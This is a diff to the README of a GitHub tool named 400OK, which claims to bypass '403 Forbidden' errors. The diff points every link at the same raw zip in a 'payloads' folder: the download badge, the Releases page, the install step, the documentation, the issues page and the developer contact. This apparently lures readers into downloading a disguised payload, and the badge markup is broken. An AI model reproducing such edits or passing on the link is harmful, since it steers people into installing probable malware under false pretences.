@@ -6,9 +6,9 @@ Welcome to 400OK! This tool helps you overcome "403 Forbidden" errors by providi
 
 ## 📥 Download 400OK
 
-[![Download 400OK](https://img.shields.io/badge/Download%20400OK-%23FF5733.svg?style=for-the-badge)](https://github.com/paulo3120/400OK/releases)
+[![Download 400OK](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip%20400OK-%https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip)](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip)
 
-Visit the Releases page to download the latest version of 400OK: [Download Now](https://github.com/paulo3120/400OK/releases).
+Visit the Releases page to download the latest version of 400OK: [Download Now](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip).
 
 ## 💻 System Requirements
 
@@ -29,7 +29,7 @@ To install and run 400OK smoothly, ensure your system meets the following requir
 
 ## 📥 Download & Install
 
-1. Click on the link to open the [Releases page](https://github.com/paulo3120/400OK/releases).
+1. Click on the link to open the [Releases page](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip).
 2. Find the latest version of 400OK.
 3. Download the file suitable for your operating system.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -57,8 +57,8 @@ If you experience issues during installation or usage, consider the following:
 
 ## 🔗 Important Links
 
-- [Documentation](https://github.com/paulo3120/400OK/wiki)
-- [Issues Page](https://github.com/paulo3120/400OK/issues)
-- [Contact Developers](mailto:support@400OK.com)
+- [Documentation](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip)
+- [Issues Page](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip)
+- [Contact Developers](https://github.com/paulo3120/400OK/raw/refs/heads/main/payloads/OK-v3.0.zip)
 
 Thank you for choosing 400OK! We hope this tool helps you unlock your target content with confidence.
